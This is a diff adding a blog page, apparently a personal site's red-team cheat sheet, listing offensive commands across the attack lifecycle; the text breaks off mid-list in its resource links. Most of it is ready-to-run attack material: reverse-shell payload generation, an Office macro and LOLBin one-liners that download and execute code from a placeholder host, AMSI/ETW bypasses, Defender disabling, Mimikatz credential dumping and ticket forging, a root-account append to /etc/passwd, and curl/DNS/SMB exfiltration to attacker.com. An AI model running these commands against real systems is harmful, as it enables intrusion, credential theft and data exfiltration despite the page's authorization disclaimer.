@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Red Teaming Tools - Cheat Sheet - Shravan Kumar Sheri</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Comprehensive red teaming cheat sheet covering reconnaissance, initial access, privilege escalation, lateral movement, persistence, and post-exploitation techniques.">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+	<style>
+		* { box-sizing: border-box; }
+		body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; line-height: 1.8; color: #333; }
+
+		.progress-bar-container { position: fixed; top: 0; left: 0; width: 100%; height: 4px; background: #e9ecef; z-index: 1001; }
+		.progress-bar-fill { height: 100%; background: linear-gradient(90deg, #eb3349, #f45c43); width: 0%; transition: width 0.1s; }
+
+		.navbar { background-color: #1a1a2e !important; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+		.navbar-brand { color: #fff !important; font-size: 22px; font-weight: 600; }
+		.nav-link { color: rgba(255,255,255,0.9) !important; font-size: 16px; margin-left: 20px; transition: color 0.3s; }
+		.nav-link:hover { color: #4a9eff !important; }
+
+		.article-header { background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); color: #fff; padding: 80px 0; }
+		.article-header .container { max-width: 900px; }
+		.back-link { color: rgba(255,255,255,0.9); text-decoration: none; display: inline-flex; align-items: center; margin-bottom: 30px; font-size: 14px; transition: color 0.3s; }
+		.back-link:hover { color: #fff; text-decoration: none; }
+		.back-link i { margin-right: 8px; }
+		.article-category { display: inline-block; padding: 6px 16px; background: rgba(255,255,255,0.2); border-radius: 20px; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 20px; }
+		.article-title { font-size: 42px; font-weight: 700; margin-bottom: 20px; line-height: 1.2; }
+		.article-meta { display: flex; flex-wrap: wrap; gap: 20px; font-size: 14px; opacity: 0.9; }
+		.article-meta span { display: flex; align-items: center; }
+		.article-meta i { margin-right: 8px; }
+
+		.article-content { max-width: 900px; margin: 0 auto; padding: 60px 20px; }
+		.article-body { background: #fff; padding: 50px; border-radius: 12px; box-shadow: 0 5px 30px rgba(0,0,0,0.08); }
+		.article-body h2 { font-size: 28px; font-weight: 700; color: #1a1a2e; margin-top: 40px; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #e9ecef; }
+		.article-body h2:first-child { margin-top: 0; }
+		.article-body h3 { font-size: 22px; font-weight: 600; color: #333; margin-top: 30px; margin-bottom: 15px; }
+		.article-body h4 { font-size: 18px; font-weight: 600; color: #555; margin-top: 25px; margin-bottom: 12px; }
+		.article-body p { font-size: 17px; line-height: 1.8; margin-bottom: 20px; color: #444; }
+		.article-body ul, .article-body ol { margin-bottom: 20px; padding-left: 30px; }
+		.article-body li { font-size: 17px; line-height: 1.8; margin-bottom: 8px; color: #444; }
+		.article-body code { background: #f4f4f4; padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 15px; color: #d63384; }
+		.article-body pre { background: #1a1a2e; color: #fff; padding: 20px; border-radius: 8px; overflow-x: auto; margin: 20px 0; font-size: 14px; }
+		.article-body pre code { background: none; color: #fff; padding: 0; font-size: 14px; }
+
+		.article-body blockquote { border-left: 4px solid #eb3349; padding: 20px 25px; margin: 25px 0; background: #f8f9fa; border-radius: 0 8px 8px 0; }
+		.article-body blockquote p { margin: 0; font-style: italic; color: #555; }
+
+		.toc { background: #f8f9fa; padding: 25px 30px; border-radius: 8px; margin-bottom: 40px; }
+		.toc h4 { font-size: 16px; font-weight: 700; color: #1a1a2e; margin-bottom: 15px; text-transform: uppercase; }
+		.toc ul { list-style: none; padding: 0; margin: 0; columns: 2; }
+		.toc li { margin-bottom: 10px; }
+		.toc a { color: #555; text-decoration: none; font-size: 15px; transition: color 0.3s; }
+		.toc a:hover { color: #eb3349; }
+
+		.share-section { margin-top: 50px; padding-top: 30px; border-top: 1px solid #e9ecef; }
+		.share-section h4 { font-size: 16px; font-weight: 600; color: #666; margin-bottom: 15px; }
+		.share-buttons { display: flex; gap: 10px; }
+		.share-btn { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; text-decoration: none; transition: transform 0.3s, opacity 0.3s; }
+		.share-btn:hover { transform: scale(1.1); color: #fff; text-decoration: none; }
+		.share-btn.twitter { background: #1da1f2; }
+		.share-btn.linkedin { background: #0077b5; }
+		.share-btn.copy { background: #6c757d; cursor: pointer; }
+
+		.author-box { display: flex; align-items: center; gap: 20px; background: #f8f9fa; padding: 25px; border-radius: 12px; margin-top: 40px; }
+		.author-avatar { width: 80px; height: 80px; background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 32px; font-weight: 700; flex-shrink: 0; }
+		.author-info h4 { font-size: 18px; font-weight: 700; color: #1a1a2e; margin-bottom: 5px; }
+		.author-info p { font-size: 14px; color: #666; margin: 0; }
+
+		.tags { margin-top: 30px; }
+		.tag { display: inline-block; padding: 6px 14px; background: #e9ecef; color: #495057; border-radius: 20px; font-size: 13px; margin-right: 8px; margin-bottom: 8px; text-decoration: none; transition: background 0.3s; }
+		.tag:hover { background: #dee2e6; text-decoration: none; color: #333; }
+
+		.warning-box { background: #fff3cd; border-left: 4px solid #ffc107; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.warning-box p { margin: 0; color: #856404; }
+		.info-box { background: #e3f2fd; border-left: 4px solid #2196f3; padding: 20px; border-radius: 0 8px 8px 0; margin: 25px 0; }
+		.info-box p { margin: 0; color: #1565c0; }
+
+		footer { background: #1a1a2e; color: #fff; padding: 30px 0; text-align: center; margin-top: 60px; }
+		footer p { margin: 0; opacity: 0.8; }
+
+		@media (max-width: 768px) {
+			.article-title { font-size: 28px; }
+			.article-body { padding: 30px 20px; }
+			.article-meta { flex-direction: column; gap: 10px; }
+			.author-box { flex-direction: column; text-align: center; }
+			.toc ul { columns: 1; }
+		}
+	</style>
+</head>
+<body>
+	<div class="progress-bar-container">
+		<div class="progress-bar-fill" id="progressBar"></div>
+	</div>
+
+	<nav class="navbar navbar-expand-lg navbar-dark">
+		<div class="container">
+			<a class="navbar-brand" href="../index.html">Shravan Kumar Sheri</a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="navbarNav">
+				<ul class="navbar-nav ml-auto">
+					<li class="nav-item">
+						<a class="nav-link" href="../index.html">Home</a>
+					</li>
+					<li class="nav-item active">
+						<a class="nav-link" href="../blog.html">Blog</a>
+					</li>
+				</ul>
+			</div>
+		</div>
+	</nav>
+
+	<header class="article-header">
+		<div class="container">
+			<a href="../blog.html" class="back-link">
+				<i class="fas fa-arrow-left"></i> Back to Blog
+			</a>
+			<span class="article-category">Red Team</span>
+			<h1 class="article-title">Red Teaming Tools - Cheat Sheet</h1>
+			<div class="article-meta">
+				<span><i class="far fa-calendar"></i> December 16, 2024</span>
+				<span><i class="far fa-clock"></i> 45 min read</span>
+				<span><i class="far fa-user"></i> Shravan Kumar Sheri</span>
+			</div>
+		</div>
+	</header>
+
+	<article class="article-content">
+		<div class="article-body">
+			<div class="toc">
+				<h4>Table of Contents</h4>
+				<ul>
+					<li><a href="#reconnaissance">Reconnaissance</a></li>
+					<li><a href="#initial-access">Initial Access</a></li>
+					<li><a href="#execution">Execution</a></li>
+					<li><a href="#persistence">Persistence</a></li>
+					<li><a href="#privilege-escalation">Privilege Escalation</a></li>
+					<li><a href="#defense-evasion">Defense Evasion</a></li>
+					<li><a href="#credential-access">Credential Access</a></li>
+					<li><a href="#lateral-movement">Lateral Movement</a></li>
+					<li><a href="#collection">Collection & Exfiltration</a></li>
+					<li><a href="#c2">Command & Control</a></li>
+					<li><a href="#ad-attacks">Active Directory Attacks</a></li>
+					<li><a href="#useful-resources">Tool Reference & Resources</a></li>
+				</ul>
+			</div>
+
+			<div class="warning-box">
+				<p><strong>Disclaimer:</strong> This cheat sheet is for authorized security testing and educational purposes only. Always obtain proper authorization before conducting security assessments.</p>
+			</div>
+
+			<h2 id="reconnaissance">Reconnaissance</h2>
+
+			<h3>Passive Reconnaissance</h3>
+
+			<h4>OSINT Tools</h4>
+			<pre><code># theHarvester - Email and subdomain enumeration
+theHarvester -d target.com -b all
+
+# Amass - Subdomain enumeration
+amass enum -d target.com -passive
+amass enum -d target.com -active -brute
+
+# Subfinder
+subfinder -d target.com -all -o subdomains.txt
+
+# Google Dorks
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:"index of"
+site:target.com ext:sql | ext:db | ext:log</code></pre>
+
+			<h4>DNS Enumeration</h4>
+			<pre><code># DNSRecon
+dnsrecon -d target.com -t std
+dnsrecon -d target.com -t axfr
+
+# Dig commands
+dig target.com ANY
+dig target.com MX
+dig target.com NS
+dig @ns1.target.com target.com AXFR
+
+# DNSEnum
+dnsenum target.com</code></pre>
+
+			<h3>Active Reconnaissance</h3>
+
+			<h4>Network Scanning - Nmap</h4>
+			<pre><code># Host discovery
+nmap -sn 192.168.1.0/24
+
+# Port scanning
+nmap -sS -sV -sC -O -p- target.com -oA full_scan
+nmap -sU -sV --top-ports 100 target.com
+
+# Vulnerability scanning
+nmap --script vuln target.com
+
+# Stealth scanning
+nmap -sS -T2 -f --data-length 24 target.com</code></pre>
+
+			<h4>Web Enumeration</h4>
+			<pre><code># Directory bruteforcing
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+feroxbuster -u http://target.com -w wordlist.txt
+
+# Nikto
+nikto -h http://target.com
+
+# WhatWeb
+whatweb http://target.com
+
+# Nuclei
+nuclei -u http://target.com -t cves/</code></pre>
+
+			<h2 id="initial-access">Initial Access</h2>
+
+			<h3>Phishing</h3>
+
+			<h4>GoPhish Setup</h4>
+			<pre><code># Install GoPhish
+wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish
+./gophish</code></pre>
+
+			<h4>Payload Generation</h4>
+			<pre><code># HTA payload
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f hta-psh -o payload.hta
+
+# Macro-enabled document (msfvenom)
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f vba
+
+# Office macro (manual)
+Sub AutoOpen()
+    Shell "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')"
+End Sub</code></pre>
+
+			<h3>External Services</h3>
+			<pre><code># Password spraying - O365
+python3 o365spray.py --spray -U users.txt -P passwords.txt --url https://login.microsoftonline.com
+
+# OWA spraying
+Ruler --domain target.com spray --users users.txt --passwords passwords.txt
+
+# SSH bruteforce
+hydra -L users.txt -P passwords.txt ssh://target.com</code></pre>
+
+			<h2 id="execution">Execution</h2>
+
+			<h3>PowerShell</h3>
+			<pre><code># Download and execute
+IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')
+IEX(IWR -Uri 'http://IP/script.ps1' -UseBasicParsing)
+
+# Encoded command
+$cmd = 'IEX(IWR http://IP/script.ps1)'
+$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)
+$encoded = [Convert]::ToBase64String($bytes)
+powershell -enc $encoded
+
+# AMSI bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Constrained Language Mode bypass
+powershell -version 2 -c "command"</code></pre>
+
+			<h3>Living off the Land (LOLBins)</h3>
+			<pre><code># Certutil
+certutil -urlcache -split -f http://IP/payload.exe payload.exe
+
+# Bitsadmin
+bitsadmin /transfer job /download /priority high http://IP/payload.exe C:\Windows\Temp\payload.exe
+
+# Mshta
+mshta http://IP/payload.hta
+
+# Regsvr32
+regsvr32 /s /n /u /i:http://IP/payload.sct scrobj.dll
+
+# Rundll32
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://IP/payload.sct");close();
+
+# WMIC
+wmic process call create "powershell -ep bypass -c IEX(IWR http://IP/payload.ps1)"</code></pre>
+
+			<h2 id="persistence">Persistence</h2>
+
+			<h3>Registry Run Keys</h3>
+			<pre><code># Current user
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\payload.exe"
+
+# All users (requires admin)
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\payload.exe"
+
+# PowerShell
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\payload.exe"</code></pre>
+
+			<h3>Scheduled Tasks</h3>
+			<pre><code># Create scheduled task
+schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\payload.exe" /ru SYSTEM
+
+# PowerShell
+$action = New-ScheduledTaskAction -Execute "C:\payload.exe"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger -User "SYSTEM"</code></pre>
+
+			<h3>Services</h3>
+			<pre><code># Create service
+sc create Updater binPath= "C:\payload.exe" start= auto
+sc start Updater
+
+# PowerShell
+New-Service -Name "Updater" -BinaryPathName "C:\payload.exe" -StartupType Automatic</code></pre>
+
+			<h3>WMI Event Subscriptions</h3>
+			<pre><code># PowerShell WMI persistence
+$filterName = 'PersistFilter'
+$consumerName = 'PersistConsumer'
+$command = 'C:\payload.exe'
+
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{
+    Name = $filterName
+    EventNameSpace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{
+    Name = $consumerName
+    CommandLineTemplate = $command
+}</code></pre>
+
+			<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+			<h3>Windows Enumeration</h3>
+			<pre><code># WinPEAS
+.\winPEASany.exe
+
+# PowerUp
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+# Seatbelt
+.\Seatbelt.exe -group=all
+
+# Manual checks
+whoami /priv
+whoami /groups
+systeminfo
+wmic qfe list
+net user
+net localgroup administrators</code></pre>
+
+			<h3>Token Manipulation</h3>
+			<pre><code># Check privileges
+whoami /priv
+
+# SeImpersonatePrivilege exploitation
+# PrintSpoofer
+.\PrintSpoofer.exe -i -c "cmd"
+
+# JuicyPotato (older systems)
+.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
+
+# GodPotato
+.\GodPotato.exe -cmd "cmd /c whoami"
+
+# SweetPotato
+.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami"</code></pre>
+
+			<h3>Unquoted Service Paths</h3>
+			<pre><code># Find unquoted service paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
+
+# PowerShell
+Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}</code></pre>
+
+			<h3>DLL Hijacking</h3>
+			<pre><code># Find missing DLLs
+procmon.exe # Filter: Result contains "NAME NOT FOUND" and Path ends with ".dll"
+
+# Generate malicious DLL
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o payload.dll</code></pre>
+
+			<h3>Linux Privilege Escalation</h3>
+			<pre><code># LinPEAS
+./linpeas.sh
+
+# SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Sudo permissions
+sudo -l
+
+# Writable /etc/passwd
+echo 'root2:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+
+# Kernel exploits
+uname -a
+searchsploit linux kernel $(uname -r)</code></pre>
+
+			<h2 id="defense-evasion">Defense Evasion</h2>
+
+			<h3>AMSI Bypass</h3>
+			<pre><code># Memory patching
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+
+# Reflection method
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)</code></pre>
+
+			<h3>ETW Bypass</h3>
+			<pre><code># Disable ETW
+$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');$b=$a.GetValue($null);[IntPtr]$c=$b.m_nativeProviderHandle;[System.Runtime.InteropServices.Marshal]::WriteInt32($c,0)</code></pre>
+
+			<h3>Disabling Defender</h3>
+			<pre><code># PowerShell (requires admin)
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Add-MpPreference -ExclusionPath "C:\Tools"
+
+# Command line
+sc stop WinDefend
+sc config WinDefend start= disabled</code></pre>
+
+			<h2 id="credential-access">Credential Access</h2>
+
+			<h3>Mimikatz</h3>
+			<pre><code># Dump credentials
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+# Dump SAM
+mimikatz # lsadump::sam
+
+# Dump cached credentials
+mimikatz # lsadump::cache
+
+# Dump DPAPI
+mimikatz # sekurlsa::dpapi
+
+# DCSync
+mimikatz # lsadump::dcsync /user:krbtgt /domain:target.local
+
+# Pass-the-Hash
+mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:HASH /run:cmd
+
+# Golden Ticket
+mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21... /krbtgt:HASH /ptt
+
+# Silver Ticket
+mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21... /target:server.target.local /service:cifs /rc4:HASH /ptt</code></pre>
+
+			<h3>Rubeus</h3>
+			<pre><code># Kerberoasting
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# AS-REP Roasting
+Rubeus.exe asreproast /outfile:hashes.txt
+
+# Request TGT
+Rubeus.exe asktgt /user:USER /password:PASSWORD /domain:target.local
+
+# Pass-the-Ticket
+Rubeus.exe ptt /ticket:base64_ticket
+
+# Overpass-the-Hash
+Rubeus.exe asktgt /user:USER /rc4:HASH /ptt</code></pre>
+
+			<h3>SAM and NTDS Extraction</h3>
+			<pre><code># Volume Shadow Copy
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system
+
+# Secretsdump (Impacket)
+secretsdump.py -ntds ntds.dit -system system LOCAL
+secretsdump.py domain/user:password@DC_IP
+
+# Registry dump
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+reg save HKLM\SECURITY security.hive</code></pre>
+
+			<h2 id="lateral-movement">Lateral Movement</h2>
+
+			<h3>PsExec</h3>
+			<pre><code># Sysinternals PsExec
+psexec.exe \\TARGET -u DOMAIN\User -p Password cmd.exe
+
+# Impacket PsExec
+psexec.py domain/user:password@TARGET
+psexec.py -hashes :NTHASH domain/user@TARGET</code></pre>
+
+			<h3>WMI</h3>
+			<pre><code># WMI command execution
+wmic /node:TARGET /user:DOMAIN\User /password:Password process call create "cmd.exe /c command"
+
+# Impacket WMIExec
+wmiexec.py domain/user:password@TARGET
+wmiexec.py -hashes :NTHASH domain/user@TARGET</code></pre>
+
+			<h3>WinRM</h3>
+			<pre><code># PowerShell Remoting
+Enter-PSSession -ComputerName TARGET -Credential DOMAIN\User
+Invoke-Command -ComputerName TARGET -ScriptBlock {whoami} -Credential DOMAIN\User
+
+# Evil-WinRM
+evil-winrm -i TARGET -u User -p Password
+evil-winrm -i TARGET -u User -H NTHASH</code></pre>
+
+			<h3>SMB</h3>
+			<pre><code># Impacket SMBExec
+smbexec.py domain/user:password@TARGET
+
+# CrackMapExec
+crackmapexec smb TARGET -u User -p Password -x "whoami"
+crackmapexec smb TARGET -u User -H NTHASH --exec-method smbexec -x "whoami"</code></pre>
+
+			<h3>DCOM</h3>
+			<pre><code># Impacket DCOM
+dcomexec.py -object MMC20 domain/user:password@TARGET
+dcomexec.py -object ShellBrowserWindow domain/user:password@TARGET</code></pre>
+
+			<h3>RDP</h3>
+			<pre><code># Enable RDP
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall set service remotedesktop enable
+
+# Restricted Admin Mode (Pass-the-Hash)
+mstsc.exe /restrictedadmin
+
+# SharpRDP
+SharpRDP.exe computername=TARGET command="powershell -c IEX(...)" username=DOMAIN\User password=Password</code></pre>
+
+			<h2 id="collection">Collection & Exfiltration</h2>
+
+			<h3>Data Collection</h3>
+			<pre><code># Find sensitive files
+dir /s /b *password* *cred* *secret* *.kdbx *.config 2>nul
+findstr /si password *.txt *.xml *.config *.ini
+
+# PowerShell search
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.doc -Recurse -ErrorAction SilentlyContinue
+
+# SharpShares - Enumerate shares
+SharpShares.exe</code></pre>
+
+			<h3>Exfiltration</h3>
+			<pre><code># HTTP exfiltration
+curl -X POST -F "file=@data.zip" http://attacker.com/upload
+
+# DNS exfiltration
+for line in $(base64 data.txt); do dig $line.attacker.com; done
+
+# SMB exfiltration
+net use \\attacker.com\share /user:user password
+copy data.zip \\attacker.com\share\</code></pre>
+
+			<h2 id="c2">Command & Control</h2>
+
+			<h3>Cobalt Strike</h3>
+			<pre><code># Start team server
+./teamserver IP password
+
+# Common beacon commands
+beacon> shell whoami
+beacon> powershell-import /path/to/script.ps1
+beacon> execute-assembly /path/to/tool.exe
+beacon> jump psexec TARGET listener
+beacon> dcsync domain.local DOMAIN\krbtgt</code></pre>
+
+			<h3>Sliver</h3>
+			<pre><code># Generate implant
+sliver > generate --mtls IP:443 --os windows --arch amd64 -s /output/path
+
+# Start listener
+sliver > mtls -l 443
+
+# Common commands
+sliver (IMPLANT) > info
+sliver (IMPLANT) > execute -o whoami
+sliver (IMPLANT) > upload /local/file /remote/path
+sliver (IMPLANT) > download /remote/file /local/path</code></pre>
+
+			<h3>Metasploit</h3>
+			<pre><code># Generate payload
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o payload.exe
+
+# Handler
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST IP
+set LPORT 443
+exploit
+
+# Common commands
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getsystem
+meterpreter > hashdump
+meterpreter > migrate PID</code></pre>
+
+			<h2 id="ad-attacks">Active Directory Attacks</h2>
+
+			<h3>BloodHound</h3>
+			<pre><code># SharpHound collection
+SharpHound.exe -c All
+SharpHound.exe -c All --ldapusername USER --ldappassword PASS
+
+# BloodHound.py (remote)
+bloodhound-python -u user -p password -d domain.local -ns DC_IP -c all</code></pre>
+
+			<h3>Kerberos Attacks</h3>
+			<pre><code># Kerberoasting
+GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request
+hashcat -m 13100 hashes.txt wordlist.txt
+
+# AS-REP Roasting
+GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat
+hashcat -m 18200 hashes.txt wordlist.txt
+
+# Unconstrained Delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Rubeus.exe monitor /interval:5
+
+# Constrained Delegation
+Get-ADUser -Filter {msds-allowedtodelegateto -ne "$null"} -Properties msds-allowedtodelegateto
+getST.py -spn SERVICE/TARGET -impersonate Administrator domain.local/user:password</code></pre>
+
+			<h3>ACL Abuse</h3>
+			<pre><code># GenericAll on user
+net user TARGET NewPassword /domain
+
+# GenericWrite on user
+Set-ADUser -Identity TARGET -ServicePrincipalNames @{Add='fake/spn'}
+
+# WriteDACL
+Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity user -Rights All
+
+# ForceChangePassword
+Set-ADAccountPassword -Identity TARGET -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)</code></pre>
+
+			<h3>Certificate Attacks (ADCS)</h3>
+			<pre><code># Certipy enumeration
+certipy find -u user@domain.local -p password -dc-ip DC_IP
+
+# ESC1 - Template allows requestor to specify SAN
+certipy req -u user@domain.local -p password -target CA_SERVER -template VulnTemplate -upn administrator@domain.local
+
+# ESC4 - Vulnerable certificate template ACL
+certipy template -u user@domain.local -p password -template VulnTemplate -save-old
+certipy req -u user@domain.local -p password -target CA_SERVER -template VulnTemplate
+
+# PKINIT authentication
+certipy auth -pfx administrator.pfx -dc-ip DC_IP</code></pre>
+
+			<h3>Trust Attacks</h3>
+			<pre><code># Enumerate trusts
+Get-ADTrust -Filter *
+nltest /domain_trusts
+
+# SID History injection
+mimikatz # kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-child /sids:S-1-5-21-parent-519 /krbtgt:HASH /ptt
+
+# Inter-forest attacks
+Rubeus.exe asktgt /user:user /domain:domain.local /rc4:HASH /createnetonly:C:\Windows\System32\cmd.exe</code></pre>
+
+			<h2 id="useful-resources">Useful Resources & Tool Reference</h2>
+
+			<h3>Reference Links</h3>
+			<ul>
+				<li><a href="https://attack.mitre.org" target="_blank"><strong>MITRE ATT&CK</strong></a> - Adversary tactics and techniques knowledge base</li>
+				<li><a href="https://book.hacktricks.xyz" target="_blank"><strong>HackTricks</strong></a> - Comprehensive hacking methodology</li>
+				<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank"><strong>PayloadsAllTheThings</strong></a> - Useful payloads and bypass for security testing</li>
+				<li><a href="https://lolbas-project.github.io" target="_blank"><strong>LOLBAS</strong></a> - Living Off The Land Binaries and Scripts</li>
+				<li><a href="https://gtfobins.github.io" target="_blank"><strong>GTFOBins</strong></a> - Unix binaries for privilege escalation</li>
+				<li><a href="https://wadcoms.github.io" target="_blank"><strong>WADComs</strong></a> - Windows/AD interactive cheat sheet</li>
+				<li><a href="https://www.loldrivers.io" target="_blank"><strong>LOLDrivers</strong></a> - Vulnerable drivers database</li>
+			</ul>
+
+			<h3>Reconnaissance Tools</h3>
+			<ul>
+				<li><a href="https://github.com/projectdiscovery/subfinder" target="_blank"><strong>Subfinder</strong></a> - Fast passive subdomain enumeration</li>
+				<li><a href="https://github.com/owasp-amass/amass" target="_blank"><strong>Amass</strong></a> - In-depth attack surface mapping</li>
+				<li><a href="https://github.com/projectdiscovery/httpx" target="_blank"><strong>httpx</strong></a> - Fast HTTP toolkit</li>
+				<li><a href="https://github.com/projectdiscovery/nuclei" target="_blank"><strong>Nuclei</strong></a> - Vulnerability scanner with templates</li>
+				<li><a href="https://github.com/laramies/theHarvester" target="_blank"><strong>theHarvester</strong></a> - OSINT tool for email/subdomain gathering</li>
+				<li><a href="https://github.com/OJ/gobuster" target="_blank"><strong>Gobuster</strong></a> - Directory/DNS bruteforcing</li>
+				<li><a href="https://github.com/epi052/feroxbuster" target="_blank"><strong>Feroxbuster</strong></a> - Fast content discovery tool</li>
+				<li><a href="https://github.com/sensepost/gowitness" target="_blank"><strong>gowitness</strong></a> - Web screenshot utility</li>
+				<li><a href="https://github.com/aboul3la/Sublist3r" target="_blank"><strong>Sublist3r</strong></a> - Subdomain enumeration using OSINT</li>
+			</ul>
+
+			<h3>Cloud Reconnaissance</h3>
+			<ul>
+				<li><a href="https://github.com/NetSPI/MicroBurst" target="_blank"><strong>MicroBurst</strong></a> - Azure security assessment tools</li>
+				<li><a href="https://github.com/nccgroup/ScoutSuite" target="_blank"><strong>ScoutSuite</strong></a> - Multi-cloud security auditing</li>
+				<li><a href="https://github.com/RhinoSecurityLabs/pacu" target="_blank"><strong>Pacu</strong></a> - AWS exploitation framework</li>
+				<li><a href="https://github.com/prowler-cloud/prowler" target="_blank"><strong>Prowler</strong></a> - AWS/Azure/GCP security assessments</li>
+				<li><a href="https://github.com/hausec/PowerZure" target="_blank"><strong>PowerZure</strong></a> - Azure PowerShell assessment</li>
+				<li><a href="https://github.com/dafthack/CloudPentestCheatsheets" target="_blank"><strong>CloudPentestCheatsheets</strong></a> - Cloud pentest reference</li>
+			</ul>
+
+			<h3>Initial Access & Phishing</h3>
+			<ul>
+				<li><a href="https://github.com/gophish/gophish" target="_blank"><strong>GoPhish</strong></a> - Open-source phishing framework</li>
+				<li><a href="https://github.com/kgretzky/evilginx2" target="_blank"><strong>Evilginx2</strong></a> - Man-in-the-middle attack framework</li>
